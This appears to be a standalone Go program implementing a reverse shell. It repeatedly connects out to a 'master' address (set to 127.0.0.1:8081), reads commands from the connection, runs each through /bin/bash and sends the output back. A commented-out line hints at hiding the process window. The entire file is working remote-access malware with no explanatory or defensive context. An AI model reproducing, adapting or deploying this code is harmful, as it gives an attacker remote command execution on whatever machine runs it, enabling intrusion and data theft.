package main

import (
    "fmt"
    "os/exec"
    "log"
    "net"
    "bufio"
    "time"
)

func reverseshell(addr string){

    chk_conn:
    // make sure the master is online
    for{
        c, e := net.Dial("tcp", addr)
        if e != nil {
            time.Sleep(3 * time.Second)
        } else {
            c.Close()
            break
        }
    }

    // now send out our shell
    conn,_:= net.Dial("tcp", addr)
    for{
        status, disconn := bufio.NewReader(conn).ReadString('\n');
        if disconn != nil {
            goto chk_conn
            break
        }
        out,err := exec.Command("/bin/bash", "-c", status).Output()
        //cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        //out, _ := cmd.Output();
        if err != nil {
            log.Fatal(err)
        } else {
            fmt.Printf(string(out))
            conn.Write([]byte(out))
        }
    }
}

func main() {
    var master_ip string
    master_ip = "127.0.0.1:8081"
    reverseshell(master_ip)
}
